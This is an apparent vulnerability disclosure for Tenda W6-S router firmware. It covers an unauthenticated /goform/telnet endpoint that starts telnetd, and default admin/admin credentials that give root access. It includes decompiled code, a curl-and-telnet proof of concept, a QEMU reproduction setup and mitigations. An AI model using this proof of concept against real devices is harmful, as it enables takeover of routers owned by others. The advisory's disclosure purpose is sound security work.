# Tenda W6-S – Unauthenticated Telnet Backdoor via `/goform/telnet` with Hardcoded Credentials

**Vulnerability Type**: Authentication Bypass / Unauthorized Remote Access
**Affected Product**: Tenda W6-S
**Affected Firmware Version**: v1.0.0.4(510)
**Vulnerable Endpoint**: `/goform/telnet`
**Impact**: Remote attacker can enable Telnet service without credentials (when default admin/admin unchanged) and gain root shell access.
**Firmware Source**: https://www.tendacn.com/material/show/103478

------

## Description

The web management interface of Tenda W6-S contains a hidden backdoor. The handler for `/goform/telnet` does not enforce authentication when the device still uses the default administrative credentials (`admin/admin`). By sending a simple HTTP POST request to `/goform/telnet`, an attacker can start the Telnet daemon (`telnetd`) and then connect to port 23 using the default credentials, gaining full root access to the device.

------

## Technical Details

The vulnerability exists in the `httpd` binary. Two key functions are responsible:

### 1. Authentication Bypass in `R7WebsSecurityHandler`

The function contains a hardcoded check:

```
if ( !strcmp("admin", byte_4BB528) && !strcmp("YWRtaW4=", byte_4BB568) && strstr(haystack, "goform/telnet") )
    return 0;   // skip authentication
```



- `byte_4BB528` and `byte_4BB568` store the default username and password (base64-encoded "admin").
- If the current configuration still uses the default credentials, any request to `/goform/telnet` bypasses all authentication.

### 2. Telnet Daemon Activation in `TendaTelnet`

When a request reaches `/goform/telnet`, the following function is invoked:

```
int __fastcall TendaTelnet(int a1) {
    system("killall -9 telnetd");
    system("telnetd &");
    websWrite(a1, "load telnetd success.");
    return websDone(a1, 200);
}
```



- It kills any existing `telnetd` process and starts a new Telnet server in the background.

The combination allows an unauthenticated remote attacker to enable Telnet and log in with hardcoded credentials.

### Default Credentials Found in Binary

- **Administrator**: `admin` / `admin`
- **User**: `user` / `user`

------

## Proof-of-Concept (PoC)

1. Send a POST request to the vulnerable endpoint:

```
curl -X POST http://<device-ip>/goform/telnet
```



(No cookies, no headers, no authentication required.)

1. After the request, the Telnet service will be running on port 23. Connect using:

```
telnet <device-ip> 23
```



Login with `admin` / `admin`.

1. In a simulated environment, the connection may close immediately due to missing login process, but the service is indeed started; on real hardware, the shell is obtained.

------

## Environment Simulation (for Reproduction)

To reproduce this vulnerability, a QEMU-based simulation environment was set up using a MIPS system with a fake `apmib.so` library to bypass hardware initialization.

### 1. Fake [apmib.so](https://apmib.so/) – LD_PRELOAD Hook Library

A custom `fake_apmib.so` library was created to intercept and emulate hardware-dependent functions:

| Function                  | Return Value        | Purpose                                 |
| :------------------------ | :------------------ | :-------------------------------------- |
| `apmib_init()`            | 1                   | Skip hardware initialization            |
| `ConnectCfm()`            | 1                   | Skip connection to cfmd                 |
| `GetValue("lan.ip", ...)` | `192.168.5.10`      | Return static IP address                |
| `connect()`               | Success             | Unix socket and TCP connections succeed |
| `ioctl(SIOCGIFHWADDR)`    | `00:11:22:33:44:55` | Return fake MAC address                 |

### 2. Network Interface Setup (Host Machine)

```
# Create bridge interface
sudo brctl addbr virbr0
sudo ifconfig virbr0 192.168.5.1/24 up

# Create and configure TAP interface
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.5.11/24 up
sudo brctl addif virbr0 tap0
```



### 3. QEMU Startup Command

```
sudo qemu-system-mips -M malta \
    -kernel vmlinux-3.2.0-4-4kc-malta \
    -hda debian_wheezy_mips_standard.qcow2 \
    -append "root=/dev/sda1" \
    -netdev tap,id=tapnet,ifname=tap0,script=no \
    -device rtl8139,netdev=tapnet \
    -nographic
```



### 4. Guest VM Network Configuration

Inside the QEMU guest system:

```
ifconfig eth0 192.168.5.10
```



### 5. Transfer Firmware Files to Guest

```
# Copy the extracted firmware filesystem and fake library
scp ./squashfs-root.tar.gz root@192.168.5.10:/root/
scp ./fake_apmib.so root@192.168.5.10:/root/squashfs-root/
```



### 6. Chroot and Start httpd

Inside the QEMU guest:

```
# Mount required system directories
mount -o bind /proc ./squashfs-root/proc
mount -o bind /dev ./squashfs-root/dev

# Fix webroot symlink
rm /root/squashfs-root/webroot
ln -s /webroot_ro /root/squashfs-root/webroot

# Enter chroot environment
chroot ./squashfs-root/ /bin/sh

# Create required runtime directories
mkdir -p /var/run /tmp
chmod 1777 /tmp

# Start httpd with LD_PRELOAD hook
LD_PRELOAD=/fake_apmib.so /bin/httpd &
```



### 7. Access Web Interface

Once `httpd` is running, the web management interface is accessible at:

```
http://192.168.5.10
```



**Default Login Credentials**: `admin` / `admin`

### 8. Test the Vulnerability

Inside the simulation environment, send the following request:

```
curl -X POST http://192.168.5.10/goform/telnet
```



Then attempt to connect via Telnet:

```
telnet 192.168.5.10 23
```



Expected result (in simulation):

```
Trying 192.168.5.10...
Connected to 192.168.5.10.
Escape character is '^]'.
Connection closed by foreign host.
```



The connection closes immediately due to the chroot environment lacking a complete login process, but the Telnet service is successfully started. On real hardware, a full root shell would be obtained.

------

## Root Cause

- Hardcoded credentials (`admin/admin`) in the binary are used as a fallback authentication check, allowing bypass when credentials haven't been changed.
- Lack of proper session validation for the `/goform/telnet` endpoint, which should be restricted to authenticated administrators.

------

## Impact

- **Unauthenticated Remote Access**: Any attacker on the same network can enable Telnet and log in with default credentials.
- **Full Device Compromise**: Once logged in, the attacker has root privileges and can read/modify configuration, install malware, or use the device as a botnet node.

------

## Suggested Mitigation

- Remove the hardcoded credential check and the Telnet backdoor.
- Require valid session/cookie authentication for all `/goform/*` endpoints.
- Disable Telnet by default and enable only via secure, authenticated configuration.
- Prompt users to change default credentials during initial setup.

------

## Affected Version (Confirmed)

- Tenda W6-S v1.0.0.4(510)

Firmware download page:
https://www.tendacn.com/material/show/103478

------

## Timeline

- **Discovery**: 2026-06-05

------

## Credits

- **Discoverer**: trister
- **Contact**: 3146229264@qq.com

------

## References

- Firmware Download: https://www.tendacn.com/material/show/103478
